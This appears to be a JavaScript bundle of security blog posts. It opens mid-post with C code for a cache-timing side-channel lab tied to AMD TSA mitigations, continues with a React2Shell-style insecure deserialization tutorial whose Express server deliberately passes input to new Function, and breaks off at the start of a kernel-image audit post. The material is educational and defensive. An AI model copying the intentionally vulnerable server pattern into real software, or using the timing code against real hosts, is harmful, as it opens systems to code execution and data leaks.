<span class="pl-k">#include</span> <span class="pl-s">&lt;stdint.h&gt;</span>

<span class="pl-k">#define</span> <span class="pl-c1">STRIDE</span> 4096
<span class="pl-k">#define</span> <span class="pl-c1">PROBE_SIZE</span> 256

<span class="pl-k">struct</span> <span class="pl-smi">shared_region</span> {
    <span class="pl-smi">uint8_t</span> <span class="pl-c1">probe_array</span>[<span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">stop</span>;      <span class="pl-c">// flag to tell victim to stop</span>
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">ready</span>;     <span class="pl-c">// flag for simple sync</span>
};</pre></div>
<p><strong>Victim process:</strong></p>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// victim.c</span>
<span class="pl-c">// gcc -O2 -march=native -o victim victim.c -lrt</span>

<span class="pl-k">#include</span> <span class="pl-s">"common.h"</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;sys/mman.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;fcntl.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;unistd.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdio.h&gt;</span>

<span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-s1">secret</span> <span class="pl-c1">=</span> <span class="pl-c1">0x7F</span>;

<span class="pl-smi">int</span> <span class="pl-en">main</span>(<span class="pl-smi">void</span>) {
    <span class="pl-smi">int</span> <span class="pl-s1">fd</span> <span class="pl-c1">=</span> <span class="pl-en">shm_open</span>(<span class="pl-s">"/tsa_demo"</span>, <span class="pl-c1">O_RDWR</span> | <span class="pl-c1">O_CREAT</span>, <span class="pl-c1">0600</span>);
    <span class="pl-en">ftruncate</span>(<span class="pl-s1">fd</span>, <span class="pl-k">sizeof</span>(<span class="pl-k">struct</span> <span class="pl-smi">shared_region</span>));
    <span class="pl-k">struct</span> <span class="pl-smi">shared_region</span> <span class="pl-c1">*</span><span class="pl-s1">sh</span> <span class="pl-c1">=</span> <span class="pl-en">mmap</span>(<span class="pl-c1">NULL</span>, <span class="pl-k">sizeof</span>(<span class="pl-c1">*</span><span class="pl-s1">sh</span>),
                                    <span class="pl-c1">PROT_READ</span> | <span class="pl-c1">PROT_WRITE</span>,
                                    <span class="pl-c1">MAP_SHARED</span>, <span class="pl-s1">fd</span>, <span class="pl-c1">0</span>);

    <span class="pl-c">// Initialize</span>
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">probe_array</span>[<span class="pl-s1">i</span>] <span class="pl-c1">=</span> <span class="pl-c1">1</span>;
    }

    <span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">ready</span> <span class="pl-c1">=</span> <span class="pl-c1">1</span>;

    <span class="pl-k">while</span> (!<span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">stop</span>) {
        <span class="pl-c">// attacker_hint could be communicated via shared memory too;</span>
        <span class="pl-c">// here we just fix it for simplicity</span>
        <span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span> <span class="pl-c1">=</span> <span class="pl-c1">0x11</span>;
        <span class="pl-smi">uint8_t</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ <span class="pl-s1">secret</span>;
        <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
        <span class="pl-smi">uint8_t</span> <span class="pl-s1">value</span> <span class="pl-c1">=</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span>;
        __asm__ <span class="pl-k">volatile</span>(<span class="pl-s">""</span> :: <span class="pl-s">"r"</span>(<span class="pl-s1">value</span>) : <span class="pl-s">"memory"</span>);
    }

    <span class="pl-k">return</span> <span class="pl-c1">0</span>;
}</pre></div>
<p><strong>Attacker process:</strong></p>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// attacker.c</span>
<span class="pl-c">// gcc -O2 -march=native -o attacker attacker.c -lrt</span>

<span class="pl-k">#include</span> <span class="pl-s">"common.h"</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;sys/mman.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;fcntl.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;unistd.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;x86intrin.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdio.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;limits.h&gt;</span>

<span class="pl-smi">uint32_t</span> <span class="pl-en">time_access</span>(<span class="pl-k">struct</span> <span class="pl-smi">shared_region</span> <span class="pl-c1">*</span><span class="pl-s1">sh</span>, <span class="pl-smi">int</span> <span class="pl-s1">idx</span>) {
    <span class="pl-smi">unsigned</span> <span class="pl-s1">aux</span>;
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t1</span> <span class="pl-c1">=</span> <span class="pl-en">__rdtscp</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">aux</span>);
    (<span class="pl-smi">void</span>)<span class="pl-c1">*</span><span class="pl-s1">addr</span>;
    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t2</span> <span class="pl-c1">=</span> <span class="pl-en">__rdtscp</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">aux</span>);
    <span class="pl-k">return</span> (<span class="pl-smi">uint32_t</span>)(<span class="pl-s1">t2</span> <span class="pl-c1">-</span> <span class="pl-s1">t1</span>);
}

<span class="pl-smi">int</span> <span class="pl-en">main</span>(<span class="pl-smi">void</span>) {
    <span class="pl-smi">int</span> <span class="pl-s1">fd</span> <span class="pl-c1">=</span> <span class="pl-en">shm_open</span>(<span class="pl-s">"/tsa_demo"</span>, <span class="pl-c1">O_RDWR</span>, <span class="pl-c1">0600</span>);
    <span class="pl-k">struct</span> <span class="pl-smi">shared_region</span> <span class="pl-c1">*</span><span class="pl-s1">sh</span> <span class="pl-c1">=</span> <span class="pl-en">mmap</span>(<span class="pl-c1">NULL</span>, <span class="pl-k">sizeof</span>(<span class="pl-c1">*</span><span class="pl-s1">sh</span>),
                                    <span class="pl-c1">PROT_READ</span> | <span class="pl-c1">PROT_WRITE</span>,
                                    <span class="pl-c1">MAP_SHARED</span>, <span class="pl-s1">fd</span>, <span class="pl-c1">0</span>);

    <span class="pl-c">// Wait for victim to init</span>
    <span class="pl-k">while</span> (!<span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">ready</span>) { }

    <span class="pl-c">// Flush cache lines first</span>
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">_mm_clflush</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">probe_array</span>[<span class="pl-s1">i</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>]);
    }

    <span class="pl-c">// Give victim some time to run and "prime" one line</span>
    <span class="pl-en">usleep</span>(<span class="pl-c1">10000</span>);

    <span class="pl-smi">uint32_t</span> <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-c1">UINT_MAX</span>;
    <span class="pl-smi">int</span> <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-c1">-1</span>;

    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">idx</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">idx</span><span class="pl-c1">++</span>) {
        <span class="pl-smi">uint32_t</span> <span class="pl-s1">t</span> <span class="pl-c1">=</span> <span class="pl-en">time_access</span>(<span class="pl-s1">sh</span>, <span class="pl-s1">idx</span>);
        <span class="pl-k">if</span> (<span class="pl-s1">t</span> <span class="pl-c1">&lt;</span> <span class="pl-s1">best_time</span>) {
            <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-s1">t</span>;
            <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-s1">idx</span>;
        }
    }

    <span class="pl-en">printf</span>(<span class="pl-s">"Best index (cross-proc) = %d, time = %u cycles\\n"</span>,
           <span class="pl-s1">best_idx</span>, <span class="pl-s1">best_time</span>);

    <span class="pl-c">// Tell victim to stop</span>
    <span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">stop</span> <span class="pl-c1">=</span> <span class="pl-c1">1</span>;

    <span class="pl-k">return</span> <span class="pl-c1">0</span>;
}</pre></div>
<p>This is closer in spirit to <strong>“victim in one context, attacker in another”</strong>, even though they’re still on the same OS and sharing memory explicitly. Real TSA removes that explicit sharing: instead of a shared array, the “shared state” is the CPU’s internal scheduler, store queue, and L1 cache.</p>
<div class="markdown-heading"><h3 class="heading-element">4.4 Connecting the lab back to TSA</h3><a id="user-content-44-connecting-the-lab-back-to-tsa" class="anchor" aria-label="Permalink: 4.4 Connecting the lab back to TSA" href="#44-connecting-the-lab-back-to-tsa"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Right after these code sections, the key takeaway is:</p>
<ul>
<li>
<p>Our toy lab uses <strong>cache presence</strong> as the side-channel signal (classic Flush+Reload / Prime+Probe).</p>
</li>
<li>
<p>TSA uses <strong>scheduler timing</strong> as the side-channel signal:</p>
<ul>
<li>False completions → invalid data forwarded → different dependency chains → different timing.</li>
</ul>
</li>
<li>
<p>In both cases, the attacker:</p>
<ol>
<li>
<strong>Influences</strong> microarchitectural state (priming),</li>
<li>Lets a victim touch secret-dependent data (access pattern),</li>
<li>Measures a <strong>timing difference</strong> in its own code,</li>
<li>Reconstructs bits of the secret over many trials.</li>
</ol>
</li>
</ul>
<p>That’s the mental bridge you want readers to cross.</p>
<hr>
<div class="markdown-heading"><h2 class="heading-element">5. Mitigations: what AMD, OSs, and clouds are doing</h2><a id="user-content-5-mitigations-what-amd-oss-and-clouds-are-doing" class="anchor" aria-label="Permalink: 5. Mitigations: what AMD, OSs, and clouds are doing" href="#5-mitigations-what-amd-oss-and-clouds-are-doing"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>TSA mitigations span firmware, OS, and virtualization layers.</p>
<div class="markdown-heading"><h3 class="heading-element">5.1 Microcode + VERW</h3><a id="user-content-51-microcode--verw" class="anchor" aria-label="Permalink: 5.1 Microcode + VERW" href="#51-microcode--verw"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>AMD ships updated <strong>microcode</strong> for vulnerable Family 19h CPUs. On top of that, they recommend using the memory form of the <code>VERW</code> instruction as a “microarchitectural scrub”:</p>
<ul>
<li>New CPUID bits tell software:
<ul>
<li>Whether TSA-L1 / TSA-SQ are not present,</li>
<li>Whether the CPU supports TSA mitigation via <code>VERW_CLEAR</code>.</li>
</ul>
</li>
<li>With appropriate microcode loaded, <strong>CPL0 (kernel / hypervisor)</strong> can execute <code>VERW</code> to clear TSA-relevant structures when crossing trust boundaries, e.g.:
<ul>
<li>Kernel → user transitions,</li>
<li>Hypervisor → guest VM transitions,</li>
<li>Before entering low-power states.</li>
</ul>
</li>
</ul>
<p>This is similar in spirit to existing post-Spectre mitigations (IBPB, STIBP, etc.) but targeted at scheduler structures.</p>
<div class="markdown-heading"><h3 class="heading-element">5.2 Linux <code>MITIGATION_TSA</code> and <code>tsa=</code> knob</h3><a id="user-content-52-linux-mitigation_tsa-and-tsa-knob" class="anchor" aria-label="Permalink: 5.2 Linux MITIGATION_TSA and tsa= knob" href="#52-linux-mitigation_tsa-and-tsa-knob"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Linux added explicit support for TSA mitigations:</p>
<ul>
<li>A new Kconfig option <code>MITIGATION_TSA</code> gates TSA-related logic.</li>
<li>A boot parameter <code>tsa=</code> controls behavior (e.g., always on, only for user/kernel transitions, only guest/host transitions, or disabled).</li>
<li>Combined with updated microcode from <code>linux-firmware</code>, this lets distros tune performance vs security trade-offs depending on threat model.</li>
</ul>
<div class="markdown-heading"><h3 class="heading-element">5.3 SEV-SNP and attestation</h3><a id="user-content-53-sev-snp-and-attestation" class="anchor" aria-label="Permalink: 5.3 SEV-SNP and attestation" href="#53-sev-snp-and-attestation"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>For AMD’s <strong>SEV-SNP</strong> (encrypted VM) environments:</p>
<ul>
<li>TSA could, in principle, allow a malicious hypervisor to infer SEV-SNP guest data.</li>
<li>Microcode and firmware updates aim to automatically mitigate TSA for SEV-SNP guests.</li>
<li>Guest owners are expected to:
<ul>
<li>Verify via <strong>attestation</strong> that the host is running the right microcode,</li>
<li>Confirm that TSA mitigations are active before trusting the platform.</li>
</ul>
</li>
</ul>
<hr>
<div class="markdown-heading"><h2 class="heading-element">6. What red teams and blue teams should actually do</h2><a id="user-content-6-what-red-teams-and-blue-teams-should-actually-do" class="anchor" aria-label="Permalink: 6. What red teams and blue teams should actually do" href="#6-what-red-teams-and-blue-teams-should-actually-do"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<div class="markdown-heading"><h3 class="heading-element">6.1 For red teams</h3><a id="user-content-61-for-red-teams" class="anchor" aria-label="Permalink: 6.1 For red teams" href="#61-for-red-teams"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>TSA probably won’t be your <strong>first</strong> move in a real engagement, but it’s worth understanding as part of a modern attack surface:</p>
<ul>
<li>
<strong>Model it as a capability</strong>:
<ul>
<li>“Given local code execution on a shared AMD Zen 3/4 host, I may be able to leak bits of privileged data over time.”</li>
</ul>
</li>
<li>
<strong>Think in campaigns, not single shots</strong>:
<ul>
<li>Meeting the timing conditions and noise requirements means you want long-lived footholds and repeated victim activity.</li>
</ul>
</li>
<li>
<strong>Use it to stress test cloud models</strong>:
<ul>
<li>Ask: “If I’m a rogue tenant on this EPYC host, what’s the maximum <em>theoretical</em> data I can extract from neighbors?”</li>
</ul>
</li>
</ul>
<p>TSA is a great hook for talks and blogs because it forces teams to think beyond “network perimeter” and even beyond “syscall boundary.” The CPU itself is part of the threat surface.</p>
<div class="markdown-heading"><h3 class="heading-element">6.2 For blue teams</h3><a id="user-content-62-for-blue-teams" class="anchor" aria-label="Permalink: 6.2 For blue teams" href="#62-for-blue-teams"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Concrete actions:</p>
<ol>
<li>
<p><strong>Patch like this is Meltdown-class, not just ‘medium CVSS’</strong></p>
<ul>
<li>Make sure:
<ul>
<li>Firmware/microcode is up to date for all Family 19h platforms,</li>
<li>OS / hypervisor builds include TSA mitigations and have <code>tsa=</code> configured appropriately.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Re-evaluate your multi-tenant risk</strong></p>
<ul>
<li>In clouds and shared hosting:
<ul>
<li>Understand which SKUs are affected,</li>
<li>Decide whether you treat TSA as an academic curiosity or something you must mitigate for specific tenants (e.g., high-sensitivity workloads).</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Include TSA in your threat modeling</strong></p>
<ul>
<li>It’s an <strong>info-leak primitive</strong>, not an RCE.</li>
<li>Combine it mentally with other bugs:
<ul>
<li>RCE → TSA → secret exfiltration → crypto break → lateral movement.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Watch for performance regressions</strong></p>
<ul>
<li>VERW-based mitigations may hurt performance; you’ll need to benchmark and possibly make different choices per environment (internal dev vs multi-tenant cloud vs regulated workloads).</li>
</ul>
</li>
</ol>
<hr>
`,Qg=`<!doctype html>
<html lang="en">
<body>
  <div class="blog-text">
    <h1>From React2Shell to Toy Labs: Understanding Insecure Deserialization with a Tiny "Fake Flight" Server</h1>
    <blockquote>
      <p>"Insecure deserialization often leads to remote code execution. Even if deserialization flaws do not result in remote code execution, they can be used to perform attacks, including replay attacks, injection attacks, and privilege escalation." — OWASP</p>
    </blockquote>
    <p>CVE-2025-55182 ("React2Shell") pushed insecure deserialization back into the spotlight:</p>
    <ul>
      <li>It’s a CVSS 10.0 RCE in <strong>React Server Components</strong> (RSC).</li>
      <li>The bug lives in the <strong>Flight protocol</strong> used by RSC: attacker-controlled data is <strong>deserialized unsafely</strong>, letting crafted objects influence server-side execution and achieve code execution on the Node.js server.</li>
    </ul>
    <p>You absolutely shouldn’t be testing real React2Shell payloads against anything but an isolated lab. But you <em>can</em> understand the core pattern with a <strong>tiny, self-contained Node.js example</strong> that mimics the same <em>class</em> of bug: deserialization of untrusted data → treating it as special internal objects → executing attacker-controlled behavior.</p>
    <p>This post walks through:</p>
    <ul>
      <li>A quick refresher on insecure deserialization.</li>
      <li>A <strong>toy "fake Flight" server</strong> in Node/Express that’s intentionally vulnerable.</li>
      <li>A harmless "payload" that only evaluates math.</li>
      <li>A safer version of the same endpoint.</li>
      <li>How this maps conceptually to real-world bugs like React2Shell.</li>
    </ul>
    <hr />
    <h2>1. Insecure deserialization in one paragraph</h2>
    <p>Insecure deserialization is when an application takes <strong>untrusted data</strong>, deserializes it into objects, and then uses those objects in ways that let an attacker:</p>
    <ul>
      <li>Manipulate logic,</li>
      <li>Abuse "magic" methods or callbacks,</li>
      <li>Or even <strong>execute arbitrary code</strong>.</li>
    </ul>
    <p>That’s why it shows up in the OWASP Top 10 and is treated as a high-risk category: unsafe deserialization logic can be a straight path to RCE.</p>
    <p>React2Shell is a modern instance of this: the server <strong>deserializes Flight payloads</strong> and interprets them as internal “Chunk” objects. Because that deserialization didn’t sufficiently validate or constrain what those objects could look like, attackers found a way to make React resolve <em>fake</em> chunks and end up running arbitrary JavaScript on the server.</p>
    <p>Let’s recreate that <em>pattern</em> in a tiny Node app.</p>
    <hr />
    <h2>2. A tiny "fake Flight" server (intentionally vulnerable)</h2>
    <p>We’ll build a Node/Express server that:</p>
    <ul>
      <li>Accepts a JSON payload that looks like a "slot map" (<code>"0"</code>, <code>"1"</code>, etc.).</li>
      <li>Pulls out slot <code>"1"</code> as a <strong>"chunk"</strong>.</li>
      <li>Treats any chunk with a <code>then</code> field as special.</li>
      <li>Calls a handler based on <code>chunk.then</code>.</li>
      <li>Uses <code>chunk._expr</code> inside <code>new Function()</code>.</li>
    </ul>
    <p>This is obviously unsafe; that’s the point. It’s a simplified version of the larger deserialization &amp; "thenable" handling patterns described in real-world React2Shell writeups.</p>
    <h3>2.1 Setup</h3>
    <pre><code class="language-bash">mkdir fake-flight-lab
cd fake-flight-lab
npm init -y
npm install express body-parser</code></pre>
    <h3>2.2 Vulnerable server (<code>server-vuln.js</code>)</h3>
    <pre><code class="language-javascript">const express = require("express");
const bodyParser = require("body-parser");

const app = express();
app.use(bodyParser.json());

// --- Fake "chunk" resolver (vulnerable) ---

// Very naive "promise-like" resolver: if an object has a \`then\` field,
// we treat it as something that needs to be "resolved" via a handler.
const thenHandlers = {
  // Our "legit" handler; mapping is attacker-controllable in this toy
  logAndEval: function (chunk, response) {
    console.log("[*] logAndEval called with chunk:", chunk);

    // Attacker-controlled field:
    const expr = chunk._expr;

    // VULNERABLE: directly compile and run attacker-controlled string.
    // In real bugs, this might be an internal expression or dynamic call.
    const fn = new Function(\`return (\${expr});\`);

    const result = fn();
    response.value = result;
  },
};

// Fake "Flight" endpoint
app.post("/fake-flight", (req, res) => {
  const payload = req.body;

  console.log("[*] Received payload:", JSON.stringify(payload, null, 2));

  // Pick slot "1" as our main "chunk"
  const chunk = payload["1"];
  const response = { value: null };

  try {
    // VULN #1: trust that whatever is in \`chunk.then\` is a valid handler name
    const handlerName = chunk.then;

    // VULN #2: look it up dynamically without validation
    const handler = thenHandlers[handlerName];

    if (typeof handler !== "function") {
      throw new Error("No such handler");
    }

    // Call the handler with the (attacker-controlled) chunk
    handler(chunk, response);

    // Serialize the result
    res.json({
      ok: true,
      result: response.value,
    });
  } catch (e) {
    console.error("[!] Error while processing fake-flight payload:", e);
    res.status(500).json({ ok: false, error: e.message });
  }
});

app.listen(3000, () => {
  console.log("VULN fake-flight server listening on http://localhost:3000");
});</code></pre>
    <p>What’s insecure here:</p>
    <ul>
      <li>We treat any object with <code>.then</code> as special and use that field to <strong>control which function runs</strong>.</li>
      <li>We take a string from <code>_expr</code> and feed it straight into <code>new Function</code> → arbitrary code path inside the Node process. This mirrors how insecure deserialization can escalate into code execution in real apps.</li>
    </ul>
    <hr />
    <h2>3. A harmless "malicious" payload (just math)</h2>
    <p>Start the server:</p>
    <pre><code class="language-bash">node server-vuln.js</code></pre>
    <p>Now send a JSON payload that looks suspiciously like a "chunk":</p>
    <pre><code class="language-bash">curl -X POST http://localhost:3000/fake-flight   -H "Content-Type: application/json"   -d '{
    "0": "meta",
    "1": {
      "status": "resolved_model",
      "_expr": "1 + 2 + 3 * 4",
      "then": "logAndEval"
    }
  }'</code></pre>
    <p>What happens:</p>
    <ol>
      <li>The server reads <code>payload["1"]</code> into <code>chunk</code>.</li>
      <li>It sees <code>chunk.then === "logAndEval"</code> and calls <code>thenHandlers.logAndEval(chunk, response)</code>.</li>
      <li><code>logAndEval</code> pulls <code>chunk._expr</code> (<code>"1 + 2 + 3 * 4"</code>).</li>
      <li>It builds <code>new Function("return (" + expr + ");")</code> → <code>new Function("return (1 + 2 + 3 * 4);")</code>.</li>
      <li>Executes it and returns:</li>
    </ol>
    <pre><code class="language-json">{
  "ok": true,
  "result": 15
}</code></pre>
    <p>This is benign — we only evaluated a math expression — but structurally we’ve reproduced the core pattern:</p>
    <ul>
      <li><strong>Attacker controls object fields</strong> (<code>then</code>, <code>_expr</code>) in the deserialized payload.</li>
      <li>The server uses those fields to <strong>drive control flow</strong> (which handler to run) and <strong>compose code to execute</strong>.</li>
    </ul>
    <p>That’s exactly the kind of chain OWASP warns about: untrusted data being deserialized and then used to manipulate object attributes or insert new ones, leading to logic abuse or code execution.</p>
    <hr />
    <h2>4. Fixing the toy: structured data, no <code>new Function</code></h2>
    <p>Now let’s add a <strong>safe</strong> variant of the same endpoint, so you can see what “good” looks like in contrast.</p>
    <h3>4.1 Safer handler</h3>
    <p>Add this to the same file (or a new one):</p>
    <pre><code class="language-javascript">// --- Safer variant: explicit, whitelisted operations only ---

const SAFE_OPS = new Set(["add", "mul"]);

function safeEvalExpression(op, a, b) {
  if (!SAFE_OPS.has(op)) {
    throw new Error("Unsupported op");
  }
  a = Number(a);
  b = Number(b);
  if (Number.isNaN(a) || Number.isNaN(b)) {
    throw new Error("Invalid numbers");
  }
  return op === "add" ? a + b : a * b;
}

app.post("/fake-flight-safe", (req, res) => {
  const payload = req.body;
  const chunk = payload["1"];
  const response = { value: null };

  try {
    // Validate structure explicitly
    if (!chunk || chunk.status !== "resolved_model") {
      throw new Error("bad status");
    }

    const { op, a, b } = chunk;

    const result = safeEvalExpression(op, a, b);
    response.value = result;

    res.json({ ok: true, result: response.value });
  } catch (e) {
    console.error("[!] Error in safe endpoint:", e);
    res.status(400).json({ ok: false, error: e.message });
  }
});</code></pre>
    <p>Now call:</p>
    <pre><code class="language-bash">curl -X POST http://localhost:3000/fake-flight-safe   -H "Content-Type: application/json"   -d '{
    "1": {
      "status": "resolved_model",
      "op": "add",
      "a": 10,
      "b": 20
    }
  }'</code></pre>
    <p>You should see:</p>
    <pre><code class="language-json">{
  "ok": true,
  "result": 30
}</code></pre>
    <p>Here we:</p>
    <ul>
      <li><strong>Don’t</strong> treat <code>then</code> as a magic field.</li>
      <li><strong>Don’t</strong> run arbitrary expressions.</li>
      <li><strong>Do</strong>:
        <ul>
          <li>Validate fields,</li>
          <li>Constrain operations to a whitelist,</li>
          <li>Coerce types.</li>
        </ul>
      </li>
    </ul>
    <p>This matches common guidance on safe deserialization: define a strict schema, validate all fields, and never deserialize directly into objects with behavior (callbacks, dynamic code) that can be triggered by untrusted data.</p>
    <hr />
    <h2>5. Mapping this toy back to React2Shell</h2>
    <p>Real-world CVE-2025-55182 is obviously more complex, but the <em>shape</em> of the bug is similar:</p>
    <ul>
      <li>RSC has a <strong>Flight protocol</strong> with a structured payload (slots, references, status codes).</li>
      <li>The server <strong>deserializes</strong> that payload into internal “Chunks”.</li>
      <li>Those chunks are treated like promise-like objects and resolved using their <code>then</code> and related fields.</li>
      <li>Because the code did not sufficiently validate or lock down the structure, <strong>attacker-supplied objects</strong> can be interpreted as internal chunks, and their fields end up influencing internal callbacks and state — eventually leading to arbitrary JS execution in the Node process.</li>
    </ul>
    <p>Security writeups on React2Shell repeatedly describe it as an <strong>unsafe / insecure deserialization flaw in the Flight protocol</strong>: untrusted data, parsed into internal structures, used to control resolution logic and server-side behavior.</p>
    <p>This toy example gives you a mental model to read those writeups:</p>
    <ul>
      <li>Anywhere you see “fake Chunk objects”, think: <em>our <code>chunk</code> object with attacker-controlled fields</em>.</li>
      <li>Anywhere you see “thenable abused”, think: <em>our <code>chunk.then</code> controlling which function runs</em>.</li>
      <li>Anywhere you see “code injected into internal expression”, think: <em>our <code>_expr</code> string passed into <code>new Function()</code></em>.</li>
    </ul>
    <hr />
    <h2>6. Takeaways for your own code</h2>
    <p>Whether or not you ever touch React Server Components, this pattern shows up everywhere:</p>
    <ul>
      <li>JSON / binary payloads mapped into "magic" objects.</li>
      <li>ORMs or serializers that hydrate classes with methods and hooks.</li>
      <li>Message formats that allow callbacks or special fields (<code>__proto__</code>, <code>then</code>, <code>_onLoad</code>, etc.).</li>
    </ul>
    <p>To avoid ending up in the same situation:</p>
    <ol>
      <li><strong>Don’t deserialize untrusted data into rich objects with behavior.</strong><br />Deserialize into plain data structures and validate them first.</li>
      <li><strong>Treat protocol fields like code, not just data.</strong><br />Anything that controls which function gets called (<code>then</code>, <code>type</code>, <code>handler</code>) needs strict allowlists.</li>
      <li><strong>Never <code>eval</code> / <code>new Function</code> on data from the network.</strong><br />If you really must interpret expressions, constrain them to a safe DSL and sandbox heavily.</li>
      <li><strong>For complex protocols (like Flight), write fuzzers and negative tests.</strong><br />When you see a deserializer that:
        <ul>
          <li>Builds graphs of objects,</li>
          <li>Treats some fields specially,</li>
          <li>Traverses prototypes / thenables…<br />…that’s a huge red flag and deserves targeted testing.</li>
        </ul>
      </li>
    </ol>
  </div>
</body>
</html>
`,Zg=`<!doctype html>
<html lang="en">
<body>
  <div class="blog-text">
    <h1>Who Can Touch Your Kernel? Auditing <code>/boot/vmlinuz-*</code> on Linux</h1>
    <p>When we talk about “protecting a Linux system,” most people think of:</p>
    <ul>
      <li>Patching services</li>
      <li>Hardening SSH</li>
      <li>Watching logs</li>
    </ul>
    <p>Almost nobody starts with the question:</p>
    <blockquote>
      <p><strong>“Who can modify my kernel image?”</strong></p>
    </blockquote>
    <p>On a typical Linux machine, that kernel image lives in files like:</p>
    <pre><code class="language-bash">/boot/vmlinuz-6.8.0-35-generic
/boot/vmlinuz-5.15.0-91-generic</code></pre>
    <p>These are not just random binaries. They <em>are</em> the operating system’s core. If an attacker can silently replace them, everything above the kernel—processes, containers, even security tools—runs on top of a compromised foundation.</p>
    <p>In this post, we’ll explore:</p>
    <ul>
      <li>What <code>/boot/vmlinuz-*</code> actually is</li>
      <li>Which code <strong>must</strong> be allowed to modify it</li>
      <li>Which code <strong>shouldn’t</strong> but still technically can</li>
      <li>How to start <strong>detecting risky conditions</strong> with a detailed Python audit script</li>
    </ul>
    <p>All from a defensive, “threat-model my own box” point of view.</p>
    <hr />
    <h2>1. What lives in <code>/boot/vmlinuz-*</code>?</h2>
    <p>On most distros, you’ll see files like:</p>
    <pre><code class="language-bash">ls -l /boot/vmlinuz-*
-rw------- 1 root root 12345678 May  1 10:00 /boot/vmlinuz-6.8.0-35-generic
-rw------- 1 root root 11765432 Mar 10 09:21 /boot/vmlinuz-5.15.0-91-generic</code></pre>
    <p>Those <code>vmlinuz-*</code> files are:</p>
    <ul>
      <li>The <strong>compressed Linux kernel images</strong></li>
      <li>Loaded by the bootloader (GRUB, systemd-boot, etc.) at boot</li>
      <li>Executed in <strong>ring 0</strong>, the most privileged CPU mode</li>
    </ul>
    <p>During boot:</p>
    <ol>
      <li>Firmware (BIOS/UEFI) loads the bootloader.</li>
      <li>Bootloader reads <code>/boot/vmlinuz-&lt;version&gt;</code> and an initramfs from disk.</li>
      <li>It hands control to the kernel.</li>
      <li>The kernel decompresses itself and starts the OS.</li>
    </ol>
    <p>If an attacker can replace this image with a modified one, they don’t just “have root”—they can:</p>
